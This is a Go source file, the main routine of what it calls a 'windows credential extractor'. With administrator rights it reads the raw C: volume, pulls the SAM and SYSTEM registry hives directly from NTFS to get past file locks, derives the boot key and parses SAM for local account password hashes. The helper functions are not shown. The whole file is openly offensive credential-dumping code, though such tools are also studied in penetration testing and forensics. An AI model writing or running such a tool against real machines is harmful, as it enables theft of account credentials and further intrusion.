package main

import (
	"fmt"
	"os"
)

func main() {
	fmt.Println("\n╔════════════════════════════════════════════════════════════╗")
	fmt.Println("║           windows credential extractor v1.0               ║")
	fmt.Println("║         sam/system direct ntfs registry parser            ║")
	fmt.Println("╚════════════════════════════════════════════════════════════╝\n")
	
	volumePath := `\\.\C:`
	
	fmt.Println("[+] initializing...")
	volumeHandle, err := openVolume(volumePath)
	if err != nil {
		fmt.Println("\n[+] access denied: must run as administrator!")
		os.Exit(1)
	}
	defer closeHandle(volumeHandle)
	
	ntfs, err := readNTFSBoot(volumeHandle)
	if err != nil {
		fmt.Printf("[+] failed to read ntfs boot sector\n")
		os.Exit(1)
	}
	
	fmt.Println("[+] reading registry hives from disk...")
	samData := extractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SAM`)
	systemData := extractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SYSTEM`)
	
	if samData == nil || systemData == nil {
		fmt.Println("[+] failed to extract registry hives")
		os.Exit(1)
	}
	
	fmt.Println("[+] parsing system hive...")
	var bootKey []byte
	if systemData != nil {
		bootKey = parseSYSTEM(systemData)
	}
	
	if bootKey == nil {
		fmt.Println("[+] failed to extract bootkey")
		os.Exit(1)
	}
	
	fmt.Println("[+] parsing sam hive...")
	if samData != nil {
		parseSAM(samData, bootKey)
	}
	
	fmt.Println("\n[+] extraction complete!\n")
}
